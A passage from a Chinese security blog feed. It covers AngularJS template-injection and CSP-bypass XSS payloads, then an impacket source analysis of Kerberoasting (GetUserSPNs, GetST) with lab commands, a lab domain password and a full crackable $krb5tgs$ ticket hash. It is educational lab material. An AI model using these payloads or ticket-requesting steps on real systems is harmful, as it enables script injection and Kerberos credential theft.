<p>在刚开始的版本可以通过这种创建匿名函数的方式去执行任意js，后来有过滤就不行了，但是过滤不断被绕过，到最后angularjs就不在把这个视为漏洞，直接取消了sandbox，angularjs觉得模版可控才是漏洞的根源。</p>
<p>在angularjs 1.x的版本中，直接加上<code>ng-app</code>就可以使用了<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123; constructor.constructor(&quot;alert(1)&quot;)() &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在一些时候，前端开发与后端开发不一致就可能导致漏洞的产生<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    Hello, <span class="meta">&lt;?php echo htmlspecialchars($_GET[&#x27;name&#x27;]) ?&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>就比如上面的代码，后端以为没问题了，但是直接请求<br><code>name=constructor.constructor(&quot;alert(1)&quot;)()</code> ，就行了，虽然引号会被转义，但是不影响他的模板解析</p>
<p><code>ng-init</code> 也允许代码的执行<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-init</span>=<span class="string">&quot;constructor.constructor(&#x27;alert(1)&#x27;)()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>同时他能用在class中<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ng-init:constructor.constructor(&#x27;alert(1)&#x27;)()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>因为这个特性，导致了微软通讯软件的rce漏洞，详细可看<br><a href="https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=12">https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=12</a></p>
<h1 id="AngularJS-CSP-Bypass"><a href="#AngularJS-CSP-Bypass" class="headerlink" title="AngularJS CSP Bypass"></a>AngularJS CSP Bypass</h1><p>先看看代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://cdnjs.cloudflare.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">autofocus</span> <span class="attr">ng-focus</span>=<span class="string">$event.composedPath()|orderBy:</span>&#x27;(<span class="attr">z</span>=<span class="string">alert)(1)</span>&#x27;&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>可以看到这个CSP规则只允许了 <a href="https://cdnjs.cloudflare.com，而且没有允许unsafe-eval，那么他却可以弹窗。">https://cdnjs.cloudflare.com，而且没有允许unsafe-eval，那么他却可以弹窗。</a><br>这是因为在AngularJS中，他自己实现了一套类似eval的东西，所以就可以执行任意代码。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这应该就是能记的部分知识点了，但是想要更深入，我觉得需要去了解AngularJS框架，或者react什么的框架源码才行，这对我来说就没什么必要了</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>从impacket源码分析SPN</title>
    <url>/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直疑惑，网上都在说，通过这个去请求服务的TGS<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><br>但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了<br><span id="more"></span></p>
<h1 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h1><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下<br>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
<h1 id="SPN-格式"><a href="#SPN-格式" class="headerlink" title="SPN 格式"></a>SPN 格式</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
<p>可以通过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setspn -A MSSQLSvc/DM.test.local:1433 sqladmin</span><br></pre></td></tr></table></figure><br>注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>之前打靶场遇到了一个问题<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><br>通过上面的命令获取到了chenchen的ST，但是从上文说的，SPN是服务的标识符，那我怎么会获取到绑定该服务的域用户的ST，按理应该是获取到服务的ST才对</p>
<h2 id="GetUserSPNs源码简析"><a href="#GetUserSPNs源码简析" class="headerlink" title="GetUserSPNs源码简析"></a>GetUserSPNs源码简析</h2><p>接下来看看<code>GetUserSPNs.py</code>的关键源码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">TGT = self.getTGT()</span><br><span class="line"><span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    fd = <span class="built_in">open</span>(self.__outputFileName, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fd = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user, SPN <span class="keyword">in</span> users.items():</span><br><span class="line">    sAMAccountName = user</span><br><span class="line">    downLevelLogonName = self.__targetDomain + <span class="string">&quot;\\&quot;</span> + sAMAccountName</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        principalName = Principal()</span><br><span class="line">        principalName.<span class="built_in">type</span> = constants.PrincipalNameType.NT_MS_PRINCIPAL.value</span><br><span class="line">        principalName.components = [downLevelLogonName]</span><br><span class="line"></span><br><span class="line">        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,</span><br><span class="line">                        self.__targetDomain + <span class="string">&quot;/&quot;</span> + sAMAccountName, fd)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception:&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="string">&#x27;Principal: %s - %s&#x27;</span> % (downLevelLogonName, <span class="built_in">str</span>(e)))</span><br></pre></td></tr></table></figure><br>先获取<code>TGT</code>。<br>接下来通过这行代码获取TGS<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br></pre></td></tr></table></figure><br>而且是用<code>user</code>，获取到<code>TGS</code>。<br>而for循环中的<code>SPN</code>是没有使用到的。</p>
<p>在这段代码最后<code>self.outputTGS</code>打印出你要请求的用户的<code>TGS</code></p>
<h2 id="GetST源码简析"><a href="#GetST源码简析" class="headerlink" title="GetST源码简析"></a>GetST源码简析</h2><p>上面的很容易理解，接下来看看<code>GetST</code>的源码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> TGT <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    tgt, cipher, sessionKey = TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>], TGT[<span class="string">&#x27;sessionKey&#x27;</span>]</span><br><span class="line">    oldSessionKey = sessionKey</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tgt <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Still no TGT</span></span><br><span class="line">    userName = Principal(self.__user, <span class="built_in">type</span>=constants.PrincipalNameType.NT_PRINCIPAL.value)</span><br><span class="line">    logging.info(<span class="string">&#x27;Getting TGT for user&#x27;</span>)</span><br><span class="line">    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,</span><br><span class="line">                                                            unhexlify(self.__lmhash), unhexlify(self.__nthash),</span><br><span class="line">                                                            self.__aesKey,</span><br><span class="line">                                                            self.__kdcHost)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ok, we have valid TGT, let&#x27;s try to get a service ticket</span></span><br><span class="line"><span class="keyword">if</span> self.__options.impersonate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Normal TGS interaction</span></span><br><span class="line">    logging.info(<span class="string">&#x27;Getting ST for user&#x27;</span>)</span><br><span class="line">    serverName = Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br><span class="line">    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)</span><br><span class="line">    </span><br><span class="line">    self.__saveFileName = self.__user</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Here&#x27;s the rock&#x27;n&#x27;roll</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        logging.info(<span class="string">&#x27;Impersonating %s&#x27;</span> % self.__options.impersonate)</span><br><span class="line">        <span class="comment"># Editing below to pass hashes for decryption</span></span><br><span class="line">        <span class="keyword">if</span> self.__additional_ticket <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,</span><br><span class="line">                                                                                            self.__kdcHost, self.__additional_ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_S_PRINCIPAL_UNKNOWN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably user %s does not have constrained delegation permisions or impersonated user does not exist&#x27;</span> % self.__user)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_BADOPTION&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable&#x27;</span> % self.__user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self.__saveFileName = self.__options.impersonate</span><br><span class="line"></span><br><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure><br>与<code>GetUserSPNs</code>相似，也是获取到<code>TGT</code>后，判断你的命令中是否有委派（这里不对委派做介绍），如果没有委派就与<code>GetUserSPNs</code>一样，通过<code>getKerberosTGS</code>获取ST。<br>但是有一点不同的地方<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br></pre></td></tr></table></figure><br>在这一行，可以看到他用到了<code>spn</code>，并且没有用到过<code>user</code></p>
<p>在代码的最后，与<code>GetUserSPNs</code>不一样，他是保存ST<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure></p>
<p>看看具体代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">saveTicket</span>(<span class="params">self, ticket, sessionKey</span>):</span><br><span class="line">    logging.info(<span class="string">&#x27;Saving ticket in %s&#x27;</span> % (self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>))</span><br><span class="line">    ccache = CCache()</span><br><span class="line"></span><br><span class="line">    ccache.fromTGS(ticket, sessionKey, sessionKey)</span><br><span class="line">    ccache.saveFile(self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>)</span><br></pre></td></tr></table></figure><br>他把ST保存成了<code>ccache</code></p>
<h1 id="SPN-or-Users"><a href="#SPN-or-Users" class="headerlink" title="SPN or Users"></a>SPN or Users</h1><p>按照上面的源码分析，那<code>GetST</code>和<code>GetUserSPNs</code>，应该是不一样的。接下来用一个真实环境来验证一下，我这里用的云镜的<strong>Certify</strong>。</p>
<h2 id="获取SPN"><a href="#获取SPN" class="headerlink" title="获取SPN"></a>获取SPN</h2><p>首先获取SPN和对应的user<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/2.png" alt></p>
<h2 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h2><p>通过<code>GetUserSPNs</code>获取user的ST<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure></p>
<p>ST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$7fa0e479f4b98d330648eace979d6899$ef080eb849dde02f3bc909fcb96bb9415c1845edcd907856ecf1a56b6c2af338afffaf7adfb5dc66cfc0dd75bf37a81eda6b6c4542167096e9095eaf7142107b9a2ec26e556090647df180b522ab8a14e19db9a47bb69a16910f7a9e67301dc8b6fb5bb05593651d96238a03475dc6f0a94802301f65decb2b28c8d3e1d5f5d1413e58c6484afa1e53deef504ff0b9d22000519954d09d491f3b707c394248cff0230c2684940b93a881cafb440b4cfe0db4bd45aaa5cd001f91f97291e45506c3d892fd44e27fb6102c242a7023e6b3f25d942d5ca0b321562d955ec8ec750d22a00d9d1aae2f11731770ac7ec39352f8f15fc3223fcee9648870e0d5ff89e64e1e1b6532ae311d086c64bc6ccad31e2eb60e83778927f17880319185bcab68121bd7ee13c0576d174fa91573b6f010f151d807e962870d3e00cd0ae20ccaa2c018ce8d0027cc6795794430c2824dc331ebff70f6d34f43548e1728329840d6fc0309fa97b3d0e77f71d15df082d84561322255fc8b29fce8a922c1e8a34a75de5c764f8d8dc3449aa6359c9b26ff8b779443d46c19220424916bdff44fb939ad69a59fd48a4df5b01eaf1c80a5955994d26880585dd19da25717e395828be889ec279ab254fc220e87acf092ce2f33a98016b38d2556f98f6b4c1a31ff309821d01f3ed2746d7b32967e6f632c39c08f9ac4a53626dd5d2d6836415bc83bf3918f640a4ac71afb6190db79828f7d0775799e412481e4bd84625b23ac96ba168e52693454762c47a13b10120b379db043d8f90b4bd5b998c7e84aab8d65261499d434f5c63c8e8bf43ee4133417fb5b04a86df9926dee30465283566a76b38f004f86e9891ce9a353713d665992695a829756b9b15ca6de95b04cd4e3a2d18767a054018f24bef9a5e40cc8f11ee01b736fefa56e05b3cd2768c0904f7545c731b26a12f311ba7fb40a36ef7eaa57b791bb2484fd98f661d10081b852206d67ddde737d3fdadb920027bf0c611c4b320da0883a075f1150f69d76d39977e3714a10659a69b339f67d6a550e3d84fd9bcf9b54297ac8f17b3202040a6af2bd0250f4495c32c46674ba661932f017d39b462a0c12c21536dfd3be2e6812623cf640f04b74c5de1eaed0be56e2230815dce87a3e7a96973d8ccaa781e65f66004c5ac9dba83a94e33f6c0bde7337a5924637d67777e5ec649b165e20180dd3a2c6f1593bd051beba17b23e0946cc4a48fd32cc3641cded1bb0e526c53d5c8fca3a5d5811f98aa59f1e5f7d086cd139e6b9790f06f1089ee1b3c959bc431949dca81261e21a4646ad0c6d4e42bd0682432bdde3f379c48958903d3dbe96565b80c18bf6334877f8f5057ee198da600ac9234bce72a8e180139df5ded784f06a4b01799a8c8651ad69d211520b06c58aa981c7591b1efcbe95a367eac90548b6d2bc594c710bde364ba58087bf5b8b53727b69139d201ddbf15aa745289a70fda4a824ca5239bcfee7ac22ec9bbb9ec6</span><br></pre></td></tr></table></figure></p>
<h2 id="GetST"><a href="#GetST" class="headerlink" title="GetST"></a>GetST</h2><p>通过<code>GetST</code>获取<code>SPN</code>的st<br>因为他有一个转换<code>ccache</code>的过程，所以要把他代码改一下<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/3.png" alt><br>增加一行<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.outputTGS(tgs, oldSessionKey, sessionKey, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>并把下面的代码粘贴到类里面</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outputTGS</span>(<span class="params">self, tgs, oldSessionKey, sessionKey, username, spn, fd=<span class="literal">None</span></span>):</span><br><span class="line">        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># According to RFC4757 (RC4-HMAC) the cipher part is like:</span></span><br><span class="line">        <span class="comment"># struct EDATA &#123;</span></span><br><span class="line">        <span class="comment">#       struct HEADER &#123;</span></span><br><span class="line">        <span class="comment">#               OCTET Checksum[16];</span></span><br><span class="line">        <span class="comment">#               OCTET Confounder[8];</span></span><br><span class="line">        <span class="comment">#       &#125; Header;</span></span><br><span class="line">        <span class="comment">#       OCTET Data[0];</span></span><br><span class="line">        <span class="comment"># &#125; edata;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># In short, we&#x27;re interested in splitting the checksum and the rest of the encrypted data</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)</span></span><br><span class="line">        <span class="comment"># last 12 bytes of the encrypted ticket represent the checksum of the decrypted </span></span><br><span class="line">        <span class="comment"># ticket</span></span><br><span class="line">        <span class="keyword">if</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.rc4_hmac.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.des_cbc_md5.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span 